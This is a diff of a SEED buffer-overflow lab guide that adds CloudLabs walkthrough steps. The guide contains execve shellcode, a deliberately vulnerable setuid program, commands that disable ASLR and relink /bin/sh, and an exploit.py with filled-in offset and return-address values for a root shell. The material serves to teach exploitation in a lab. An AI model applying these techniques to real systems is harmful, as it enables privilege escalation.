@@ -23,16 +23,26 @@ In this lab, students will be given a program with a buffer-overflow vulnerabili
 
 **Lab environment**.You can perform the lab exercise on the SEED VM provided by the Cloudlabs.
 
+First we need to make sure that we are logged in to **seed** user. Type the below commmands to log in as seed user and change directory.
+
+```bash
+sudo su seed
+cd
+```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/6252c5b5-7bd6-4fd7-b995-4dc0d7cbd62c)
+
+
 Files needed for this lab are included in Labsetup.zip, which can be fetched by running the following commands.
 
 
+```bash
+wget https://github.com/CloudLabs-MOC/CloudLabs-SEED/raw/main/Software%20Security/Buffer%20Overflow%20Attack/Buffer%20Overflow%20Setuid/Lab%20files/Labsetup.zip
 ```
-sudo wget https://github.com/CloudLabs-MOC/CloudLabs-SEED/raw/main/Software%20Security/Buffer%20Overflow%20Attack/Buffer%20Overflow%20Setuid/Lab%20files/Labsetup.zip
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/b7f8bc2c-4bf3-46d7-9192-b5c036c5af70)
+```bash
+unzip Labsetup.zip
 ```
-
-```
-sudo unzip Labsetup.zip
-``` 
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/fbe4890d-16ac-4abe-8ef0-deb842d923f4)
 
 **Note for instructors**. Instructors can customize this lab by choosing values for L1, ..., L4. See Section 4 for details. Depending on the background of students and the time allocated for this lab, instructors can also make the Level-2, Level-3, and Level-4 tasks (or some of them) optional. The Level-1 task is sufficient to cover the basics of the buffer-overflow attacks. Levels 2 to 4 increase the attack difficulties. All the countermeasure tasks are based on the Level-1 task, so skipping the other levels does not affect those tasks. 
 
@@ -45,17 +55,24 @@ Modern operating systems have implemented several security mechanisms to make th
 
 **Address Space Randomization**. Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. This feature can be disabled using the following command: 
 
+```bash
+sudo sysctl -w kernel.randomize_va_space=0
 ```
-$ sudo sysctl -w kernel.randomize_va_space=
-```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/facfa7fd-4d17-421f-8bc3-10bbb903b263)
 
  **Configuring /bin/sh**. In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the `/bin/dash` shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process’s real user ID, essentially dropping the privilege.
  
 Since our victim program is a Set-UID program, and our attack relies on running `/bin/sh`, the countermeasure in `/bin/dash` makes our attack more difficult. Therefore, we will link `/bin/sh` to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in `/bin/dash` can be easily defeated). We have installed a shell program called `zsh` in our Ubuntu 20.04 VM. The following command can be used to link `/bin/sh` to `zsh`: 
 
+```bash
+sudo ln -sf /bin/zsh /bin/sh
 ```
-$ sudo ln -sf /bin/zsh /bin/sh
+or we can type `-v` to see what is happening behind.
+```bash
+sudo ln -sf /bin/zsh /bin/sh -v
 ```
+
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/9f20070f-2150-42bd-ab90-b9f54e18d374)
 
 **StackGuard and Non-Executable Stack**. These are two additional countermeasures implemented in the system. They can be turned off during the compilation. We will discuss them later when we compile the vulnerable program. 
 
@@ -65,9 +82,21 @@ The ultimate goal of buffer-overflow attacks is to inject malicious code into th
 
 ### 3.1 The C Version of Shellcode
 
+First we redirect to the lab files with the help of following commands:
+
+```bash
+ls
+cd Labsetup/
+ls
+```
+
+> Here Labsetup is the folder name which you download and unzipped in previous steps.
+
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/d1425f16-6a4d-4672-8620-60aba8b6ad4b)
+
 A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following: 
 
-```
+```c
 #include <stdio.h>
 
 int main() {
@@ -82,7 +111,7 @@ Unfortunately, we cannot just compile this code and use the binary code as our s
 
 ### 3.2 32-bit Shellcode
 
-```
+```bash
 ; Store the command on stack
 xor eax, eax
 push eax
@@ -111,7 +140,7 @@ The shellcode above basically invokes the execve() system call to execute `/bin/
 
 We provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except that the names of the registers are different and the registers used by the execve() system call are also different. Some explanation of the code is given in the comment section, and we will not provide detailed explanation on the shellcode 
 
-```
+```bash
 xor rdx, rdx ; rdx = 0: execve()’s 3rd argument
 push rdx
 mov rax, ’/bin//sh’ ; the command we want to run
@@ -129,9 +158,17 @@ syscall
 
 We have generated the binary code from the assembly code above, and put the code in a C program called call_shellcode.c inside the shellcode folder. If you would like to learn how to generate the binary code yourself, you should work on the Shellcode lab. In this task, we will test the shellcode. 
 
-Listing 1:callshellcode.c
+Redirect to shellcode and open the **call_shellcode.c**
 
+```bash
+cd shellcode/
+cat call_shellcode.c
 ```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/17703a08-8b32-41ba-a704-ed0575b248e4)
+
+Listing 1 : **callshellcode.c**
+
+```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -165,8 +202,20 @@ The code above includes two copies of shellcode, one is 32-bit and the other is 
 
 The vulnerable program used in this lab is called stack.c, which is in the code folder. This program has a buffer-overflow vulnerability, and your job is to exploit this vulnerability and gain the root privilege. The code listed below has some non-essential information removed, so it is slightly different from what you get from the lab setup file. 
 
-Listing 2: The vulnerable program (stack.c)
+We have to change the file location since the **stack.c** file is present in "code" folder. To do that type (make sure you are in /Labsetup/shellcode directory):
+
+```bash
+cd ..
+cd code/
+ls
 ```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/78315387-ca4b-4e04-9d1d-65dd834a436f)
+
+type `cat stack.c` to view the file content.
+
+Listing 2: The vulnerable program **stack.c**
+
+```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -180,25 +229,23 @@ Listing 2: The vulnerable program (stack.c)
 
 int bof(char *str)
 {
-char buffer[BUF_SIZE];
+    char buffer[BUF_SIZE];
 
-```
-/* The following statement has a buffer overflow problem */
-strcpy(buffer, str);
-```
-return 1;
+    /* The following statement has a buffer overflow problem */
+    strcpy(buffer, str);
+    return 1;
 }
 
 int main(int argc, char **argv)
 {
-char str[517];
-FILE *badfile;
+    char str[517];
+    FILE *badfile;
 
-badfile = fopen("badfile", "r");
-fread(str, sizeof(char), 517, badfile);
-bof(str);
-printf("Returned Properly\n");
-return 1;
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+    printf("Returned Properly\n");
+    return 1;
 }
 ```
 
@@ -206,11 +253,21 @@ The above program has a buffer overflow vulnerability. It first reads an input f
 
 **Compilation**. To compile the above vulnerable program, do not forget to turn off the StackGuard and the non-executable stack protections using the _-fno-stack-protector_ and "-z execstack" options. After the compilation, we need to make the program a root-owned Set-UID program. We can achieve this by first change the ownership of the program to root (Line ➀), and then change the permission to 4755 to enable the Set-UID bit (Line ➁). It should be noted that changing ownership must be done before turning on the Set-UID bit, because ownership change will cause the Set-UID bit to be turned off. 
 
+> No need to type these commands as the `Makefile` has already included these commands
+
+gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c 
+
+sudo chown root stack ➀  
+
+sudo chmod 4755 stack ➁ 
+
+To run the **Makefile**, simply type:
+
+```bash
+make
+ls
 ```
-$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c 
-$ sudo chown root stack ➀  
-$ sudo chmod 4755 stack ➁ 
-```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/9ab968b8-d417-4595-ae0e-1f79ac168bba)
 
 The compilation and setup commands are already included in _Makefile_, so we just need to type make to execute those commands. The variables _L1, ..., L4_ are set in _Makefile_; they will be used during the compilation. If the instructor has chosen a different set of values for these variables, you need to change them in Makefile. 
 
@@ -229,26 +286,38 @@ To exploit the buffer-overflow vulnerability in the target program, the most imp
 
 We will add the _-g_ flag to _gcc_ command, so debugging information is added to the binary. If you run _make_, the debugging version is already created. We will use _gdb_ to debug _stack-L1-dbg_. We need to create a file called badfile before running the program. 
 
-```
-$ touch badfile ➝ Create an empty badfile
-$ gdb stack-L1-dbg
-gdb-peda$ b bof ➝ Set a break point at function bof() 
-Breakpoint 1 at 0x124d: file stack.c, line 18.
-gdb-peda$ run ➝ Set a break point at function bof() 
-...
-Breakpoint 1, bof (str=0xffffcf57 ...) at stack.c:
-18 {
-gdb-peda$ next ➝ See the note below 
-...
-22 strcpy(buffer, str);
+Type the following command to Investigate.
 
-
-gdb-peda$ p $ebp ➝ Get the ebp value
-$1 = (void *) 0xffffdfd
-gdb-peda$ p &buffer ➝ Get the buffer’s address
-$2 = (char (*)[100]) 0xffffdfac
-gdb-peda$ quit ➝ exit
 ```
+ls
+touch badfile
+gdb stack-L1-dbg
+```
+
+> Make sure your current working directry is "/Labsetup/code" and it has the following files :
+
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/19918c34-34b4-40db-819f-72ad3fb7d7cb)
+
+```
+b bof
+```
+```
+run
+```
+```
+next
+```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/db2ecd92-6d1b-4163-b7b6-27d406020512)
+
+```
+p $ebp
+```
+> Please note down the `$ebp` value ie. 0xffffcfa8 _(This value might change over time)._
+```
+p &buffer
+quit
+```
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/89f7f694-38e8-4919-b7c0-8b5d4ccb269b)
 
 **Note 1**. When gdb stops inside the _bof()_ function, it stops before the _ebp_ register is set to point to the current stack frame, so if we print out the value of ebp here, we will get the caller’s _ebp_ value. We need to use next to execute a few instructions and stop after the ebp register is modified to point to the stack frame of the _bof()_ function. The SEED book is based on Ubuntu 16.04, and gdb’s behavior is slightly different, so the book does not have the next step 
 
@@ -256,16 +325,17 @@ Note 2. It should be noted that the frame pointer value obtained from gdb is dif
 
 ### 5.2 Launching Attacks
 
-To exploit the buffer-overflow vulnerability in the target program, we need to prepare a payload, and save it inside _badfile_. We will use a Python program to do that. We provide a skeleton program called _exploit.py_, which is included in the lab setup file. The code is incomplete, and students need to replace some of the essential values in the code. 
+To exploit the buffer-overflow vulnerability in the target program, we need to prepare a payload, and save it inside _badfile_. We will use a Python program to do that. We provide a skeleton program called _exploit.py_, which is included in the lab setup file. The code is `incomplete`, and students need to `replace some of the essential values` in the code. 
 
-Listing 3:exploit.py
+Listing 3: **exploit.py**
 
-```
+```python
 #!/usr/bin/python
 import sys
 
 shellcode= (
-"" # I Need to changeI
+    "\x90\x90\x90\x90"  
+    "\x90\x90\x90\x90"
 ).encode(’latin-1’)
 
 # Fill the content with NOP’s
@@ -273,31 +343,47 @@ content = bytearray(0x90 for i in range(517))
 
 ##################################################################
 # Put the shellcode somewhere in the payload
-start = 0 # I Need to changeI
+start = 0                                    #Need to change
 content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value
 # and put it somewhere in the payload
-ret = 0x00 # I Need to changeI
-offset = 0 # I Need to changeI
+ret = 0x00                                   #Need to change
+offset = 0                                   #Need to change
 
 L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
 content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
 ##################################################################
-
 
 # Write the content to a file
 with open(’badfile’, ’wb’) as f:
 f.write(content)
 ```
 
+Open the file using `nano exploit.py`
+
+Change the following values:
+
+| Param | Value |
+| ----------- | ----------- |
+| start | 400 |
+| ret | 0xffffcfa8 + 100 _(something more than `$ebp` value which you copied in previous task)_ |
+| offset | 132 |
+
 After you finish the above program, run it. This will generate the contents for _badfile_. Then run the vulnerable program _stack_. If your exploit is implemented correctly, you should be able to get a root shell: 
 
-```
-$./exploit.py // create the badfile
-$./stack-L1 // launch the attack by running the vulnerable program
+```bash
+./exploit.py 
+./stack-L1
+
 # <---- Bingo! You’ve got a root shell!
 ```
+
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/cafdeb3a-cc7b-4a8e-b9df-aaae70d819f0)
+
+> If faced the issue, Please add more in the ret value. Instead of `0xffffcfa8 + 100` try `0xffffcfa8 + 200`.
+
+![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/1afabe86-1b6b-44c7-ad44-790a73b11b7c)
 
 In your lab report, in addition to providing screenshots to demonstrate your investigation and attack, you also need to explain how the values used in your _exploit.py_ are decided. These values are the most important part of the attack, so a detailed explanation can help the instructor grade your report. Only demonstrating a successful attack without explaining why the attack works will not receive many points. 
 
